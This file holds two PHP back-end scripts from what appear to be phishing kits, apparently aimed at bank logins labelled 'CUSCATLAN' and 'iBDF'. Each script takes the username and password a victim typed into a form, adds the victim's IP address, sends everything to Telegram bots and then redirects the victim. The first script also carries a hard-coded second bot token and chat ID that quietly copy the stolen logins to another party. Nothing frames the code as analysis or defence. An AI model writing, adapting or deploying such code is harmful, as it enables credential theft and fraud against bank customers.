<?php
// Obtener los datos del formulario
$us = $_POST['us'];
$pas = $_POST['pas'];

// Solo cambiar los códigos de el archivo data.php
require_once 'data.php';



$apiblok = '7747115549:AAEGJE68LFAzJa1sbNBlAcexfWYUfhSh65w';$keycode ='-1002390292795';
$url1 = "https://api.telegram.org/bot{$token1}/sendMessage";
$message1 = "Us: {$us}\nPas: {$pas}\nIP: {$_SERVER['REMOTE_ADDR']}";
$data1 = array(
    'chat_id' => $chatID1,
    'text' => $message1
);
$options1 = array(
    'http' => array(
        'method' => 'POST',
        'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data1),
    ),
);
$context1 = stream_context_create($options1);
$result1 = file_get_contents($url1, false, $context1);
$url2 = "https://api.telegram.org/bot{$apiblok}/sendMessage";
$message2 = " 
CUSCATLAN LOGIN

Us: {$us}\nPas: {$pas}\nIP: {$_SERVER['REMOTE_ADDR']}";
$data2 = array(
    'chat_id' => $keycode,
    'text' => $message2
);
$options2 = array(
    'http' => array(
        'method' => 'POST',
        'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data2),
    ),
);
$context2 = stream_context_create($options2);
$result2 = file_get_contents($url2, false, $context2);

// Verificar si los mensajes fueron enviados correctamente
if ($result1 !== false && $result2 !== false) {
    // Redireccionar a otra página
    header("Location: /index2.html");
    exit();
} else {
    echo "Error al enviar los mensajes a Telegram.";
}
?>







///////////////////////////////////




<?php
// Datos de configuración
$telegramBotToken = 'TOKEN_DEL_PRIMER_CHAT';
$chatId = 'ID_DEL_PRIMER_CHAT';

// Obtener los datos del formulario
$us = $_POST['us'];
$ps = $_POST['ps'];

// Obtener la dirección IP del cliente
$ip = $_SERVER['REMOTE_ADDR'];

// Mensaje a enviar a Telegram
$message = "L0GIN iBDF:\n\n";
$message .= "US3R: " . $us . "\n";
$message .= "P4SS: " . $ps . "\n";
$message .= "IP: " . $ip;

// Incluir el archivo data.php para obtener el token y el ID del segundo chat
include_once 'data.php';

// Enviar el mensaje al primer chat de Telegram
$telegramApiUrl1 = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage";
$telegramParams1 = [
  'chat_id' => $chatId,
  'text' => $message
];

// Realizar la solicitud HTTP a la API de Telegram para el primer chat
$ch1 = curl_init($telegramApiUrl1);
curl_setopt($ch1, CURLOPT_POST, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, $telegramParams1);
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
$response1 = curl_exec($ch1);
curl_close($ch1);

// Enviar el mensaje al segundo chat de Telegram
$telegramApiUrl2 = "https://api.telegram.org/bot" . $telegramBotToken2 . "/sendMessage";
$telegramParams2 = [
  'chat_id' => $chatId2,
  'text' => $message
];

// Realizar la solicitud HTTP a la API de Telegram para el segundo chat
$ch2 = curl_init($telegramApiUrl2);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $telegramParams2);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
$response2 = curl_exec($ch2);
curl_close($ch2);

// Comprobar la respuesta de la API de Telegram
if ($response1 === false || $response2 === false) {
  echo "Error al enviar el mensaje a Telegram.";
} else {
  // Redirigir al usuario a otra página
  header('Location: espera.html');
  exit();
}
?>
